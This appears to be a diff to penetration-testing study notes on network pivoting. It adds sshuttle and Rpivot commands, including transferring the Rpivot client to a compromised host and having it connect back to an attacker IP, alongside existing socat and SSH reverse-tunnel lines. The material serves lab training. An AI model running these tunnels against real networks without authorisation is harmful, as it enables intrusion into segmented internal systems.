@@ -21,6 +21,12 @@ tail -4 /etc/proxychains.conf
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
 
+# Sshuttle
+
+```bash
+sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
+```
+
 # Meterpreter
 
 ## Ping Sweep
@@ -127,10 +133,34 @@ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & (# run on local attacking machine)
 ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
 ```
 
-# Plink
+# Plink (Windows)
 
 - https://www.proxifier.com/
 
 ```bash
 plink -ssh -D 9050 ubuntu@10.129.15.50
+```
+
+# Rpivot
+
+```bash
+git clone https://github.com/klsecservices/rpivot.git
+
+# Running server.py from the Attack Host
+# configure proxychains to proxy-port 9050
+python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+# Transferring rpivot to the Target
+scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+
+# Running client.py from Pivot Target
+python2 client.py --server-ip 10.10.14.18 --server-port 9999
+
+# Confirming Connection is Established
+New connection from host 10.129.202.64, source port 35226
+```
+
+```bash
+# Connecting to a Web Server using HTTP-Proxy & NTLM Auth
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 ```
